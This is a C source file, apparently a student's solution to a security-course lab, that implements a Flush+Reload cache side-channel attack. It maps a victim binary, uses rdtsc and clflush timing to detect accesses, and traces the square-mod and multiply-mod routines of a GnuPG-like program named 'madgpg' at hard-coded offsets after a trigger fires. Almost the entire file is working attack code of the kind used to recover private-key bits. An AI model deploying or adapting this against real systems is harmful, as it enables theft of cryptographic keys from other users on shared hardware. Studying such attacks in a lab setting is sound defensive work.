#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
/*
Write a program  monitor <filename> <offset> <period>, which uses the monitor function from Task 3 to 
monitor the specified offset in the file every period cycles. The program continues monitoring until 
it detects 2000 accesses or when it fails to detect accesses for 10,000,000,000 cycles (about 3-4 
seconds). On exit, the program prints the times (cycle counts from rdtsc) at which it detected 
addresses - one time per line. Note that printing takes a long time, so you want to store the results 
in memory and print them after monitoring completes.

We provide a test program at /home/victim/frtest.  The test program accepts a file name and an offset, 
and performs 1000 accesses to the specified location. The program prints the times at which it 
performed the access. Use frtest to measure monitor accuracy for monitoring periods of 1000, 2000, 
..., 20000 cycles.
*/

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size - offset;
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, file_descriptor, offset);
	if (mapping == MAP_FAILED){
		printf("mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return mapping;  // mapping will be implicitly unmapped when calling function will be exited
}

static __inline__ uint32_t rdtsc(void)
{
    uint32_t lo;
    __asm__ volatile ("rdtscp" : "=a" (lo) : : "ecx", "edx");
    return lo;
}

uint32_t flush_reload(void *p)
{
	volatile unsigned long time;    
    __asm__ volatile (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " mov r8, rax 		\n"
        " mov rax, [%1]		\n"
        " lfence            \n"
        " rdtsc             \n"
        " sub rax, r8 		\n"
        " clflush [%1] 		\n"
        : "=&a" (time)
        : "r" (p)
        : "rdx", "r8");
    return time;
}

int monitor(void *p, uint32_t period, uint64_t maxwait)
{
	uint64_t start,  global_start = rdtsc();
	while (rdtsc() - global_start < maxwait)
	{	
		start = rdtsc();
		if (flush_reload(p) < 100){
			return 1;
		} 	
		while(rdtsc() - start < period);
	}
	return 0;
}


void fr_trace(void *p0, void *p1, void *p2, uint32_t period, uint32_t *trace)
{
	uint32_t start; 
	for(int i=0; !monitor(p0, period, period); i++) // repeat count times
	{
		start = rdtsc();
		trace[2*i] = flush_reload(p1); // probe p1
		trace[2*i+1] = flush_reload(p2); // probe p2
		while(rdtsc() - start < period); // wait period 
	}
}



#define PERIOD 10000
#define MAXWAIT 10000000000

int main(){
	// input validation
	
	char *filename_madgpg = "/home/victim/madgpg";
	char *filename_trigger = "/home/victim/trigger";
	uint64_t offset1 = 0xd57ed; // sqr mod
	uint64_t offset2 = 0x571f; // mul_mod
	
	void *p_trigger = map(filename_trigger, 0);
	void *p_madgpg = map(filename_madgpg, 0);
	void *p_sqr_mod = (void *)(((uint64_t)p_madgpg)+offset1);
	void *p_mul_mod = (void *)(((uint64_t)p_madgpg)+offset2);	
	printf("mmapped files and calculated absolute adrs of functions! Waiting for trigger...\n");
	//void *p_sqr_mod = map(filename_madgpg, offset1);
	//void *p_mul_mod = map(filename_madgpg, offset2);
	
		
	uint64_t start = rdtsc();
	while(rdtsc()-start < 1000000000); // 
	uint32_t traces[200000] = {0};
	
	// monitor trigger	
	while(!monitor(p_trigger, PERIOD, MAXWAIT)); // wait for activity (access to trigger)
	printf("detected trigger access! start monitoring square and multiplication operations!\n");
	
	// trace sqr, mul, monitor trigger
	fr_trace(p_trigger, p_sqr_mod, p_mul_mod, PERIOD, traces);
	
	printf("detected trigger access! finished monitoring square and multiplication operations!\n");

	// print
	printf("printing operations...\n");
	for (int i=0;i<10000;i++) printf("%u\n", traces[i]);

	return 0; // finish programm, unmap mapping
}
